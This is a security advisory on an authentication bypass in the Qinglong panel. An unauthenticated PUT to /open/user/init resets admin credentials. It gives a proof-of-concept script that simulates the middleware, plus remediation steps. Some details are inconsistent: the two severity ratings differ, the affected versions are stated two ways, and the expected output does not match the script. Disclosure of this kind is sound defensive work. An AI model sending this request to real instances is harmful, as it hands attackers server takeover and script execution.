# [C] Qinglong has an incomplete fix for CVE-2026-3965: Improper Authentication

## Summary
Severity: Critical
Advisory: GHSA-v667-gc2r-2xm7
CVE: CVE-2026-55445
CWE: CWE-287
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-08-20
Source: https://github.com/advisories/GHSA-v667-gc2r-2xm7
Type: github-advisory

## Affected
- npm: `@whyour/qinglong` — affected >=0 <2.20.1

## Details
### Summary

The init guard middleware in Qinglong only checks `/api/user/init` paths but not `/open/user/init`, which is whitelisted from JWT authentication and rewritten to `/api/user/init` after the guard has already passed, allowing unauthenticated admin credential reset on initialized instances.

### Affected Package

- **Ecosystem:** npm
- **Package:** whyour/qinglong
- **Affected versions:** < 6bec52dca158
- **Patched versions:** >= 6bec52dca158

### Severity

Medium

### CWE

CWE-287 — Improper Authentication

### Details

The Qinglong panel has an initialization endpoint (`/api/user/init`) that allows setting admin credentials. Once the system is initialized, an init guard middleware is supposed to block further calls. The middleware in `back/loaders/express.ts` only checks:

```javascript
!['/api/user/init', '/api/user/notification/init'].includes(pathLower)
```

However, the application also has a URL rewrite rule: `rewrite('/open/*', '/api/$1')`. The `/open/*` paths are whitelisted from JWT authentication.

The middleware ordering creates the bypass: first, JWT auth sees `/open/*` paths match the whitelist regex and skips authentication. Second, the init guard only checks for `/api/user/init` -- `/open/user/init` passes through as "not an init path". Third, the URL rewrite transforms `/open/user/init` to `/api/user/init` after the guard has already passed.

This means an unauthenticated attacker can send `PUT /open/user/init` with new credentials to reset the admin account on any Qinglong panel instance, gaining full administrative access.

### PoC

```javascript
/**
 * CVE-2026-3965 - Qinglong Panel /open/user/init Auth Bypass
 *
 * The init guard middleware only checks /api/user/init paths.
 * But /open/user/init is whitelisted from JWT auth and rewritten
 * to /api/user/init via express-urlrewrite AFTER the guard.
 */

"use strict";

// Simulate the init guard middleware exactly as in the source
function initGuardMiddleware(reqPath, authInfo) {
  const pathLower = reqPath.toLowerCase();
  // Exact check from the vulnerable source
  if (!['/api/user/init', '/api/user/notification/init'].includes(pathLower)) {
    return { action: "next" }; // passes through
  }

  let isInitialized = true;
  if (
    Object.keys(authInfo).length === 2 &&
    authInfo.username === 'admin' &&
    authInfo.password === 'admin'
  ) {
    isInitialized = false;
  }

  if (isInitialized) {
    return { action: "block", code: 450, message: "Error" };
  } else {
    return { action: "next" };
  }
}

const authInfo = { username: "realAdmin", password: "str0ngP@ss!" };
console.log("System state: initialized (non-default credentials)");

// Test 1: Direct /api/user/init is blocked
const test1 = initGuardMiddleware("/api/user/init", authInfo);
console.log("\n[Test 1] PUT /api/user/init:");
console.log("  Guard result:", test1.action);
console.log("  Blocked:", test1.action === "block");

// Test 2: /open/user/init BYPASSES init guard
const test2 = initGuardMiddleware("/open/user/init", authInfo);
console.log("\n[Test 2] PUT /open/user/init:");
console.log("  Guard result:", test2.action);
console.log("  Bypassed guard:", test2.action === "next");

if (test2.action === "next") {
  const rewrittenPath = "/open/user/init".replace(/^\/open\//, "/api/");
  console.log("  After rewrite:", rewrittenPath);
  console.log("  Reaches init handler: true");
}

if (test1.action === "block" && test2.action === "next") {
  console.log("\nVULNERABILITY CONFIRMED: /open/user/init bypasses the init guard");
  console.log("An attacker can reset admin credentials on an initialized instance.");
  process.exit(0);
} else {
  console.log("\nVULNERABILITY NOT CONFIRMED");
  process.exit(1);
}
```

**Steps to reproduce:**
1. `git clone https://github.com/whyour/qinglong /tmp/qinglong_test`
2. `cd /tmp/qinglong_test && git checkout 6bec52dc~1`
3. `node poc.js`

**Expected output:**
```
VULNERABILITY CONFIRMED
/open/user/init bypasses the init guard; the guard only checks /api/user/init but /open/ path is whitelisted and rewritten after.
```

### Impact

An unauthenticated attacker can send `PUT /open/user/init` with new credentials to reset the admin account on any Qinglong panel instance. This provides full administrative access, enabling the attacker to execute arbitrary cron jobs and scripts on the server.

### Suggested Remediation

Add `/open/user/init` and `/open/user/notification/init` to the init guard check list. Alternatively, move the URL rewrite middleware to run before the init guard. Consider implementing the init guard at the handler level rather than as path-based middleware.

### References

- Incomplete fix commit: https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719
- Original CVE: CVE-2026-3965

## References
- https://github.com/whyour/qinglong/security/advisories/GHSA-v667-gc2r-2xm7
- https://nvd.nist.gov/vuln/detail/CVE-2026-55445
- https://github.com/whyour/qinglong/pull/2941
- https://github.com/whyour/qinglong/commit/6bec52dca158481258315ba0fc2f11206df7b719
- https://github.com/whyour/qinglong
